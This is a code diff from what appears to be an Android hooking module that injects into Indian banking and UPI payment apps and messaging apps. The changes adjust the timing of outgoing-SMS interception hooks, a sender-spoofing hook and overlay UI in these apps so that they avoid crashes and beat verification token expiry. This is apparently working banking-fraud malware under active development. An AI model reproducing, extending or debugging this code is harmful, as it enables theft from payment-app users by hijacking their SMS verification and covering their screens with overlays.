@@ -119,10 +119,9 @@ bool native_overlay_wanted() {
     return access("/data/local/tmp/hivirtus_disable_overlay.flag", F_OK) != 0;
 }
 
-/** Bubble only on a few hosts — every bank WebView overlay = open crash. */
+/** Bubble: Hero + Messages only — PhonePe overlay was open-crash risk. */
 bool overlay_allowed_pkg(const std::string& pkg) {
     if (pkg.empty()) return false;
-    if (pkg.find("phonepe") != std::string::npos) return true;
     if (pkg.find("herofincorp") != std::string::npos) return true;
     if (pkg.find("messaging") != std::string::npos) return true;
     if (pkg == "com.android.mms" || pkg == "com.motorola.messaging") return true;
@@ -131,6 +130,13 @@ bool overlay_allowed_pkg(const std::string& pkg) {
 
 bool is_yespay(const std::string& pkg) {
     return pkg.find("yespay") != std::string::npos || pkg.find("yesbank") != std::string::npos;
+}
+
+bool is_hero_pkg(const std::string& pkg) {
+    if (pkg.empty()) return false;
+    if (pkg.find("herofincorp") != std::string::npos) return true;
+    if (pkg.find("hero") != std::string::npos && pkg.find("fincorp") != std::string::npos) return true;
+    return false;
 }
 
 struct DeferredOverlayJob {
@@ -338,24 +344,26 @@ public:
         }
 
         if (is_msg_) {
-            // Messages: full path — real SIM ISms + Java
+            // Messages: full path — real SIM ISms + Java (FAST — Hero often sends via Messages)
             overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
             outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
             sender_spoof::install(env_, api_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
-            schedule_deferred_java_sms(env_, pkg_, 3);
             report_line(api_, "post_msg_ok:" + pkg_);
-        } else {
-            // UPI/banking SAFE: no immediate Java/Binder/phone/overlay
+        } else if (is_hero_pkg(pkg_)) {
+            // Hero ONLY: Java ISms immediately (no 3–5s wait → no verification failed / token expire)
             outgoing_sms_hook::arm_intercept_hooks();
-            int delay = upi_registry::hook_startup_delay_sec(pkg_);
-            if (delay < 3) delay = 3;
-            if (is_yespay(pkg_)) delay = 5;
-            schedule_deferred_sms_hooks(env_, api_, pkg_, delay);
-            report_line(api_, "post_upi_safe_deferred:" + pkg_ + "|d=" + std::to_string(delay));
+            overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
+            schedule_deferred_java_sms(env_, pkg_, 1);
+            report_line(api_, "post_hero_fast_java:" + pkg_);
             if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
-                schedule_overlay_ui(env_, api_, pkg_, delay + 2);
+                schedule_overlay_ui(env_, api_, pkg_, 2);
             }
+        } else {
+            // PhonePe/GPay/Paytm/YesPay/FamPay/BHIM: Intent arm ONLY — NO Java/Binder/overlay
+            // (deferred Java was still crashing these on open)
+            outgoing_sms_hook::arm_intercept_hooks();
+            report_line(api_, "post_upi_no_java_crashfix:" + pkg_);
         }
 
         touch_heartbeat();
